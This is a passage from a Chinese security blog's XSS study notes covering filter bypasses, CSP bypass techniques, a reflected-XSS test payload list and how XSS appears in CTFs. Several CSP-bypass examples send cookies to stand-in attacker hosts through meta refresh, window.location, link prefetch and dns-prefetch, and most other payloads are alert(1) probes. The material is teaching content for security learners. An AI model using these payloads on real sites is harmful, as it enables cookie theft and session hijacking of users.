<p>绕过方式2)</p>
<p>如果限制输入长度为20</p>
<p>利用事件(Event)来缩短所需要的字节数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;onclick&#x3D;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<p>加上空格符,刚好够20个字节,实际输出为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type&#x3D;text value&#x3D;&quot;&quot; onclick&#x3D;alert(1)&#x2F;&#x2F;&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>绕过方式3)</p>
<p>将XSS payload 写在别的地方,再同过简短的代码来加载XSS payload.最常用的就是”location.hash” 而且根据HTTP协议,location.hash的内容不会在HTTP包中发送,所以服务器端的Web日志中并不会记录下location.hash里的内容,更好的隐藏了攻击者的意图.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick&#x3D;&quot;eval(location.hash.substr(1))&quot;</span><br></pre></td></tr></table></figure>

<p>输出后的HTML是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type&#x3D;&quot;text&quot; value&#x3D;&quot;&quot; onclick&#x3D;&quot;eval(location.hash.substr(1))&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>因为location.hash的第一个字符是#,所以必须去除第一个字符才行.</p>
<p>故URL为 <a target="_blank" rel="noopener" href="http://www.test.com/test.html#alert(1)">http://www.test.com/test.html#alert(1)</a>  ,当用户点击文本框时,location.hash里面的代码被执行</p>
<p>绕过方式4)</p>
<p>在某些情况下,可以<strong>利用注释符绕过长度限制</strong></p>
<p>比如有两个文本框,第一个文本框有限制,而第二个限制的并不是很多的情况就可以用注释绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一个input框中,输入 &quot;&gt;&lt;!-- 在第二个input框中输入 --&gt;&lt;script&gt;alert(&#39;xss&#39;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>最终的效果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input id&#x3D;1 type type&#x3D;&quot;text&quot; value&#x3D;&quot;&quot;&gt;&lt;!--&quot; &#x2F;&gt; xxxx &lt;input id&#x3D;2 type&#x3D;&quot;text&quot; value&#x3D;&quot;--&gt;&lt;script&gt;alert(&#39;xss&#39;);&lt;&#x2F;script&gt;&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>中间的代码全部被注释掉</p>
<h2 id="XSS过滤并不智能"><a href="#XSS过滤并不智能" class="headerlink" title="XSS过滤并不智能"></a>XSS过滤并不智能</h2><p>如用户输入1+1&lt;3, 如果直接把&lt;过滤了,就有违背用户.因此应该看<strong>具体情况具体对待</strong></p>
<h2 id="浏览器Bug"><a href="#浏览器Bug" class="headerlink" title="浏览器Bug"></a>浏览器Bug</h2><p>字符集的bug在IE中出现过很多次，第一个就是<strong>UTF-7</strong>，但是这个只在之前的版本中可用，现在讨论一个在现在的浏览器当中可以执行的javascript。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xsst.sinaapp.com&#x2F;utf-32-1.php?charset&#x3D;utf-8&amp;v&#x3D;XSS</span><br></pre></td></tr></table></figure>

<p>这个页面当中我们可控当前页面的字符集，当我们常规的测试时：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xsst.sinaapp.com&#x2F;utf-32-1.php?charset&#x3D;utf-8&amp;v&#x3D;&quot;&gt;&lt;img src&#x3D;x onerror&#x3D;prompt(0);&gt;</span><br></pre></td></tr></table></figure>

<p>返回结果可以看到双引号被编码了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;&lt;&#x2F;meta&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; value&#x3D;&quot;&quot;&gt;&lt;img src&#x3D;x onerror&#x3D;prompt(0);&gt;&quot;&gt;&lt;&#x2F;input&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt; </span><br></pre></td></tr></table></figure>

<p>设置字符集为<strong>UTF-32</strong>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xsst.sinaapp.com&#x2F;utf-32-1.php?charset&#x3D;utf-32&amp;v&#x3D;%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80&#x2F;script%E3%B8%80</span><br></pre></td></tr></table></figure>

<p>上面这个在IE9及以下版本可以执行成功。</p>
<p>利用0字节绕过：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;scri%00pt&gt;alert(1);&lt;&#x2F;scri%00pt&gt;</span><br><span class="line">&lt;scri\x00pt&gt;alert(1);&lt;&#x2F;scri%00pt&gt;</span><br><span class="line">&lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;&#x2F;s%00c%00r%00%00ip%00t&gt;</span><br></pre></td></tr></table></figure>

<h2 id="绕过CSP"><a href="#绕过CSP" class="headerlink" title="绕过CSP"></a>绕过CSP</h2><h3 id="CSP介绍"><a href="#CSP介绍" class="headerlink" title="CSP介绍"></a>CSP介绍</h3><p>一个CSP头由多组CSP策略组成，中间由分号分隔，就像这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39; www.baidu.com; script-src &#39;unsafe-inline&#39;</span><br></pre></td></tr></table></figure>

<p>其中每一组策略包含一个<strong>策略指令</strong>和一个<strong>内容源</strong>列表</p>
<h4 id="一、常用的策略指令："><a href="#一、常用的策略指令：" class="headerlink" title="一、常用的策略指令："></a>一、常用的策略指令：</h4><ul>
<li><h5 id="default-src"><a href="#default-src" class="headerlink" title="default-src"></a>default-src</h5></li>
</ul>
<p>default-src 指令定义了那些没有被更精确指令指定的安全策略。这些指令包括：</p>
<ul>
<li><p>child-src</p>
</li>
<li><p>connect-src</p>
</li>
<li><p>font-src</p>
</li>
<li><p>img-src</p>
</li>
<li><p>media-src</p>
</li>
<li><p>object-src</p>
</li>
<li><p>script-src</p>
</li>
<li><p>style-src</p>
</li>
<li><h5 id="script-src"><a href="#script-src" class="headerlink" title="script-src"></a>script-src</h5></li>
</ul>
<p>script-src定义了页面中Javascript的有效来源</p>
<ul>
<li><h5 id="style-src"><a href="#style-src" class="headerlink" title="style-src"></a>style-src</h5></li>
</ul>
<p>style-src定义了页面中CSS样式的有效来源</p>
<ul>
<li><h5 id="img-src"><a href="#img-src" class="headerlink" title="img-src"></a>img-src</h5></li>
</ul>
<p>img-src定义了页面中图片和图标的有效来源</p>
<ul>
<li><h5 id="font-src"><a href="#font-src" class="headerlink" title="font-src"></a>font-src</h5></li>
</ul>
<p>font-src定义了字体加载的有效来源</p>
<ul>
<li><h5 id="connect-src"><a href="#connect-src" class="headerlink" title="connect-src"></a>connect-src</h5></li>
</ul>
<p>connect-src定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源。</p>
<ul>
<li><h5 id="child-src"><a href="#child-src" class="headerlink" title="child-src"></a>child-src</h5></li>
</ul>
<p>child-src 指定定义了 web workers 以及嵌套的浏览上下文（如frame和frame）的源。</p>
<h4 id="二、内容源："><a href="#二、内容源：" class="headerlink" title="二、内容源："></a>二、内容源：</h4><p>内容源有三种：源列表、关键字和数据</p>
<ul>
<li><h5 id="源列表"><a href="#源列表" class="headerlink" title="源列表"></a>源列表</h5></li>
</ul>
<p>源列表是一个字符串，指定了一个或多个互联网主机（通过主机名或 IP 地址），和可选的或端口号。站点地址可以包含可选的通配符前缀 (星号, ‘<em>‘)，端口号也可以使用通配符 (同样是 ‘</em>‘) 来表明所有合法端口都是有效来源。主机通过空格分隔。<br> 有效的主机表达式包括：<br> http://*<a target="_blank" rel="noopener" href="http://.foo.com/">.foo.com</a> （匹配所有使用 http协议加载 <a target="_blank" rel="noopener" href="http://foo.com/">foo.com</a> 任何子域名的尝试。）<br> mail.foo.com:443 （匹配所有访问 mail.foo.com 的 443 端口 的尝试。）<br> <a target="_blank" rel="noopener" href="https://store.foo.com/">https://store.foo.com</a> （匹配所有使用 https协议访问 <a target="_blank" rel="noopener" href="http://store.foo.com/">store.foo.com</a> 的尝试。）<br> 如果端口号没有被指定，浏览器会使用指定协议的默认端口号。如果协议没有被指定，浏览器会使用访问该文档时的协议。</p>
<ul>
<li><h5 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h5><ul>
<li><strong>‘none’</strong><br> 代表空集；即不匹配任何 URL。两侧单引号是必须的。</li>
<li><strong>‘self’</strong><br> 代表和文档同源，包括相同的 URL 协议和端口号。两侧单引号是必须的。</li>
<li><strong>‘unsafe-inline’</strong><br> 允许使用内联资源，如内联的script元素、javascript: URL、内联的事件处理函数和内联的style元素，两侧单引号是必须的。</li>
<li><strong>‘unsafe-eval’</strong><br> 允许使用 eval() 等通过字符串创建代码的方法。两侧单引号是必须的。</li>
</ul>
</li>
</ul>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: <span class="keyword">default</span>-src <span class="string">&#x27;self&#x27;</span> trustedscripts.foo.com</span><br></pre></td></tr></table></figure>

<ul>
<li><h5 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h5><ul>
<li><strong>data:</strong><br> 允许data: URI作为内容来源。</li>
<li><strong>mediastream:</strong><br> 允许mediastream: URI作为内容来源。</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39;; img-src &#39;self&#39; data:; media-src mediastream:</span><br></pre></td></tr></table></figure>

<h3 id="绕过CSP的几种方式"><a href="#绕过CSP的几种方式" class="headerlink" title="绕过CSP的几种方式"></a>绕过CSP的几种方式</h3><h4 id="一、url跳转"><a href="#一、url跳转" class="headerlink" title="一、url跳转"></a>一、url跳转</h4><p>在default-src ‘none’的情况下，可以使用meta标签实现跳转</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;refresh&quot; content&#x3D;&quot;1;url&#x3D;http:&#x2F;&#x2F;www.xss.com&#x2F;x.php?c&#x3D;[cookie]&quot; &gt;</span><br></pre></td></tr></table></figure>

<p>在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  window.location&#x3D;&quot;http:&#x2F;&#x2F;www.xss.com&#x2F;x.php?c&#x3D;[cookie]&quot;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="二、link标签预加载"><a href="#二、link标签预加载" class="headerlink" title="二、link标签预加载"></a>二、link标签预加载</h4><p>CSP对link标签的预加载功能考虑不完善。<br> 在Chrome下，可以使用如下标签发送cookie（最新版Chrome会禁止）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;prefetch&quot; href&#x3D;&quot;http:&#x2F;&#x2F;www.xss.com&#x2F;x.php?c&#x3D;[cookie]&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>在Firefox下，可以将cookie作为子域名，用dns预解析的方式把cookie带出去，查看dns服务器的日志就能得到cookie</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;dns-prefetch&quot; href&#x3D;&quot;&#x2F;&#x2F;[cookie].xxx.ceye.io&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="三、利用浏览器补全"><a href="#三、利用浏览器补全" class="headerlink" title="三、利用浏览器补全"></a>三、利用浏览器补全</h4><p>有些网站限制只有某些脚本才能使用，往往会使用script标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;none&#39;;script-src &#39;nonce-abc&#39;</span><br></pre></td></tr></table></figure>

<p>那么当脚本插入点为如下的情况时</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;插入点&lt;&#x2F;p&gt;</span><br><span class="line">&lt;script id&#x3D;&quot;aa&quot; nonce&#x3D;&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>可以插入</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//14.rs</span> <span class="attr">a</span>=<span class="string">&quot;</span></span></span><br></pre></td></tr></table></figure>

<p>这样会拼成一个新的script标签，其中的src可以自由设定</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;script src&#x3D;&#x2F;&#x2F;14.rs a&#x3D;&quot;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;script id&#x3D;&quot;aa&quot; nonce&#x3D;&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="四、代码重用"><a href="#四、代码重用" class="headerlink" title="四、代码重用"></a>四、代码重用</h4><p>Blackhat2017上有篇<a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf">ppt</a>总结了可以被用来绕过CSP的一些JS库。<br> 例如假设页面中使用了Jquery-mobile库，并且CSP策略中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，那么下面的向量就可以绕过CSP：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div data-role&#x3D;popup id&#x3D;&#39;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&#39;&gt;&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>

<p>在这个PPT之外的还有一些库也可以被利用，例如RCTF2018中遇到的amp库，下面的标签可以获取<strong>名字为FLAG的cookie</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;amp-pixel src&#x3D;&quot;http:&#x2F;&#x2F;your domain&#x2F;?cid&#x3D;CLIENT_ID(FLAG)&quot;&gt;&lt;&#x2F;amp-pixel&gt;  </span><br></pre></td></tr></table></figure>

<h4 id="五、iframe"><a href="#五、iframe" class="headerlink" title="五、iframe"></a>五、iframe</h4><p>1.如果页面A中有CSP限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过CSP：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;B&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure>

<p>2.在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御，例如”<a target="_blank" rel="noopener" href="http://xxx&quot;页面有个js库会过滤xss向量,我们就可以使用csp属性来禁掉这个js库./">http://xxx&quot;页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库。</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe csp&#x3D;&quot;script-src &#39;unsafe-inline&#39;&quot; src&#x3D;&quot;http:&#x2F;&#x2F;xxx&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure>

<h4 id="六、meta标签"><a href="#六、meta标签" class="headerlink" title="六、meta标签"></a>六、meta标签</h4><p>meta标签有一些不常用的功能有时候有奇效：<br> meta可以控制缓存（在header没有设置的情况下），有时候可以用来绕过CSP nonce。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;cache-control&quot; content&#x3D;&quot;public&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>meta可以设置Cookie（Firefox下），可以结合<strong>self-xss</strong>利用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Set-Cookie&quot; Content&#x3D;&quot;cookievalue&#x3D;xxx;expires&#x3D;Wednesday,21-Oct-98 16:14:21 GMT; path&#x3D;&#x2F;&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="绕过htmlspecialchars-实体编码"><a href="#绕过htmlspecialchars-实体编码" class="headerlink" title="绕过htmlspecialchars()实体编码"></a>绕过htmlspecialchars()实体编码</h3><p>如果输出在在 <code>input</code> 标签中,可以用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;oninput&#x3D;alert&#96;1&#96;</span><br><span class="line">&#39;oninput&#x3D;alert&#96;1&#96;&#39;  在input中输入内容时触发事件</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;onchange&#x3D;alert&#96;1&#96; 发生改变的时候触发该事件</span><br><span class="line">&#39;onchange&#x3D;alert&#96;1&#96;&#39;</span><br></pre></td></tr></table></figure>

<p>why?因为<strong>htmlspecialchars()默认不过滤单引号</strong></p>
<p>只有设置了：quotestyle 选项为ENT_QUOTES才会过滤单引号</p>
<p>在<code>script</code> 中 直接使用<code>alert</code></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_14989227/article/details/76160172">https://blog.csdn.net/qq_14989227/article/details/76160172</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xishaonian/p/7196604.html">https://www.cnblogs.com/xishaonian/p/7196604.html</a></p>
<h1 id="0x07-XSS漏洞挖掘"><a href="#0x07-XSS漏洞挖掘" class="headerlink" title="0x07  XSS漏洞挖掘"></a>0x07  XSS漏洞挖掘</h1><p>挖掘XSS漏洞,大部分都是靠自动化工具和一些手动挖掘,手动挖掘主要是浏览器bug,字符集问题</p>
<h2 id="1-反射型XSS漏洞挖掘"><a href="#1-反射型XSS漏洞挖掘" class="headerlink" title="1)反射型XSS漏洞挖掘"></a>1)反射型XSS漏洞挖掘</h2><p><img src="https://upload-images.jianshu.io/upload_images/1155692-865aa6e8904a0509.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/918"></p>
<p>反射型XSS攻击者可控的输入点有 path query fragment,而fragment很少会有</p>
<p>看一个普通的URL</p>
<p><a target="_blank" rel="noopener" href="http://www.foo.com/xss.php?id=1">http://www.foo.com/xss.php?id=1</a> ,如果攻击者进行XSS测试,将下面的payload分别添加到id=1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1&lt;&#x2F;script&gt;</span><br><span class="line">&#39;&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;img src&#x3D;@ onerror&#x3D;alert(1) &#x2F;&gt;</span><br><span class="line">&#39;&quot;&gt;&lt;img&#x2F;src&#x3D;@ onerror&#x3D;alert(1)&#x2F;&gt;</span><br><span class="line">&#39; onmouseover&#x3D;alert(1) x&#x3D; &#39;</span><br><span class="line">&quot; onmouseover&#x3D;alert(1) x&#x3D;&quot;</span><br><span class="line">&#96; onmouseover&#x3D;alert(1) x&#x3D; &#96;</span><br><span class="line">javascript:alert(1)&#x2F;&#x2F;</span><br><span class="line">data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg&#x3D;&#x3D;</span><br><span class="line">    &#39;&quot;;alert(1)&#x2F;&#x2F;</span><br><span class="line">&lt;&#x2F;script&gt;&lt;script&gt;alert(1)</span><br><span class="line">&#125;x:expression(alert(1))</span><br><span class="line">alert(1)&#x2F;&#x2F;</span><br><span class="line">*&#x2F;--&gt;&#39;&quot;&lt;&#x2F;iframe&gt;&lt;&#x2F;script&gt;&lt;&#x2F;style&gt;&lt;&#x2F;title&gt;&lt;&#x2F;textarea&gt;&lt;&#x2F;xmp&gt;&lt;&#x2F;noscript&gt;&lt;&#x2F;noframes&gt;&lt;&#x2F;plaintext&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>​    然后根据请求后的反应来看是否有弹窗或者引起浏览器脚本错误,如果出现这些情况,几乎可以判断是存在XSS漏洞的</p>
<p>主要是看代码出现的位置</p>
<h2 id="2-存储型XSS漏洞挖掘"><a href="#2-存储型XSS漏洞挖掘" class="headerlink" title="2)存储型XSS漏洞挖掘"></a>2)存储型XSS漏洞挖掘</h2><p>存储型XSS挖掘与反射型XSS挖掘的内容也大同小异,不过这里一般是表单的提交,然后进入服务端存储中,最终会在某个页面输出.这个过程最难的就是”输出”</p>
<ul>
<li>表单提交后跳转到的页面有可能是输出点</li>
<li>表单所在的页面有可能就是输出点</li>
<li>表单提交后不见了,然后就要整个网站去找目标输出点</li>
</ul>
<h2 id="3-DOM型XSS漏洞挖掘"><a href="#3-DOM型XSS漏洞挖掘" class="headerlink" title="3)DOM型XSS漏洞挖掘"></a>3)DOM型XSS漏洞挖掘</h2><p>输入点(sources)和输出点(sinks)</p>
<p>挖掘方法又静态方法和动态方法</p>
<p>静态方法就是使用正则表达式来匹配,动态方法就是利用浏览器的动态.</p>
<p>这部分内容有点难以理解,我可能也用不到太多.不做过多的总结,需要时Google.</p>
<h1 id="0x08-XSS在CTF中应用"><a href="#0x08-XSS在CTF中应用" class="headerlink" title="0x08 XSS在CTF中应用"></a>0x08 XSS在CTF中应用</h1><p>XSS在CTF中,一般就是用来窃取cookie/session 一些简单的题目,可能会在cookie中就含有flag</p>
<p>并且一般的XSS平台都会有相应的payload</p>
<p>最主要的考察就是XSS绕过,以及bypass CSP,以及 XSS,CSRF,SSRF的综合应用.</p>
<p>这里放两个WP学习</p>
<p><a target="_blank" rel="noopener" href="http://blog.knownsec.com/2018/04/tctf0ctf2018-xss-writeup/">TCTF/0CTF2018 XSS Writeup</a></p>
<p><a target="_blank" rel="noopener" href="http://blog.neargle.com/2017/09/01/ddctf-web-xss-sqli-writeup/">ddctf 两道web题的Writeup (sqli &amp; xss)</a></p>
<p>等我后面写了XSS的题目,就放一个WP在这里</p>
<h1 id="0x09-总结"><a href="#0x09-总结" class="headerlink" title="0x09  总结"></a>0x09  总结</h1><p>关于XSS漏洞的东西其实还有很多,而且各自奇怪的XSS payload也很多.要做到举一反三,确实,很难…</p>
<p>所以就多见识一点,多具体应用实操,熟悉了也就差不多懂了</p>
<p>最重要的还是<strong>在代码层面上,理解漏洞原理</strong>.比如构造闭合,绕过这些,都是代码层面的思路</p>
<h1 id="0x10-参考资料"><a href="#0x10-参考资料" class="headerlink" title="0x10  参考资料"></a>0x10  参考资料</h1><ul>
<li><a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/web/xss-zh/">https://ctf-wiki.github.io/ctf-wiki/web/xss-zh/</a></li>
<li><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/">https://zh.wikipedia.org/wiki/</a></li>
<li><a target="_blank" rel="noopener" href="http://127.0.0.1/DVWA-master/vulnerabilities/xss_s/">http://127.0.0.1/DVWA-master/vulnerabilities/xss_s/</a> </li>
<li><a target="_blank" rel="noopener" href="https://www.netsparker.com/blog/web-security/dom-based-cross-site-scripting-vulnerability/">https://www.netsparker.com/blog/web-security/dom-based-cross-site-scripting-vulnerability/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/159689.html">经验分享 | XSS手工利用</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/31230.html">由XSS漏洞引发的僵尸网络DDos攻击风暴</a></li>
<li><a target="_blank" rel="noopener" href="https://thehackerblog.com/more-advanced-xss-denial-of-service-attacks/">More Advanced XSS Denial of Service Attacks?</a></li>
<li><a target="_blank" rel="noopener" href="https://tech.meituan.com/2018/09/27/fe-security.html">前端安全系列(一):如何防止XSS攻击?</a> </li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/jessysong/article/details/77140565">防御XSS攻击的七条原则</a></li>
<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/533/">用 javascript 框架绕过 XSS 防御</a></li>
<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/xss-collect.html">那些年我们没能bypass的xss filter[from wooyun]</a></li>
<li><a target="_blank" rel="noopener" href="https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec">https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec</a></li>
<li><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html">Bypass xss过滤的测试方法</a></li>
<li><a target="_blank" rel="noopener" href="https://v0w.top/2018/08/18/XSS%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5&%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/#XSS%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8">XSS攻击手段&amp;在CTF中的运用</a></li>
<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f1de775bc43e">CSP策略及绕过方法</a></li>
<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/177/">持久化XSS</a></li>
<li>&lt;&lt;白帽子讲Web安全&gt;&gt;第三章</li>
<li>&lt;&lt;Web前端黑客技术揭秘&gt;&gt;</li>
</ul>
<h1 id="0x11-最后"><a href="#0x11-最后" class="headerlink" title="0x11 最后"></a>0x11 最后</h1><p>关于这篇XSS笔记,会持续更新,改进,扩展内容</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">m0nk3y</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://hack-for.fun/418.html">https://hack-for.fun/418.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/XSS/">XSS</a></div><div class="social-share pull-right" data-disabled="google,facebook"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/523e.html"><i class="fa fa-chevron-left">  </i><span></span></a></div><div class="next-post pull-right"><a href="/6910.html"><span></span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2021 By m0nk3y</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script 